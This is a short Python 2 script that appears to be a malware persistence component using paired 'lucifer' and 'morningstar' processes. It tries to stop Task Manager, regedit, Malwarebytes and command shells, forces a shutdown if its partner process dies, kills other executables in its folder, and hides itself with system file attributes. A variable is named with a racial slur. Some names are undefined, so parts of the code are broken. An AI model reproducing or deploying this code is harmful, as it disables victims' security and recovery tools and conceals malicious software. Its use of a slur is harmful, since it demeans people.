import os
import sys
import threading
import thread
import time
import settings
import subprocess
import psutil

class watchman(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		badwinprocs = ['taskmgr', 'regedit', 'mbam', 'cmd', 'command']
		if 'lucifer' in sys.argv[0]:
			exe = "morningstar"
		else:
			exe = "lucifer"
		while 1:
			#
			processlist = psutil.pids()
			x = False
			for process in processlist:
				try:
					proc = psutil.Process(process)
					print proc.name()
					if exe in proc.name():
						x = True
					elif proc.name() in badwinprocs:
						proc.stop()
				except: print 'psutil error'
			if x == False:
				print exe + ' not running...'
				os.popen('Shutdown -s -f -t 000')
				sys.exit()
				#break
			#
			
def startup():
	time.sleep(5)
	try:
		startupshit = glob.glob("*.exe")
		for nigger in startupshit:
			try:
				if nigger in sys.argv[0]:
					pass
				else:
					os.popen(killcmd + ' ' + nigger)
			except:
				print prefix + "couldn't kill the " + nigger # HA!
		subprocess.check_call("attrib +R +S +H " + sys.argv[0], shell=True)
	except:
		pass

if 'lucifer' in sys.argv[0]:
	print "[ > ] Morningstar loaded"
else:
	thread.start_new_thread(startup, ())
	print "[ > ] Startup loaded"
	time.sleep(5)
	watchman().start()
	print "[ > ] Watchman loaded"
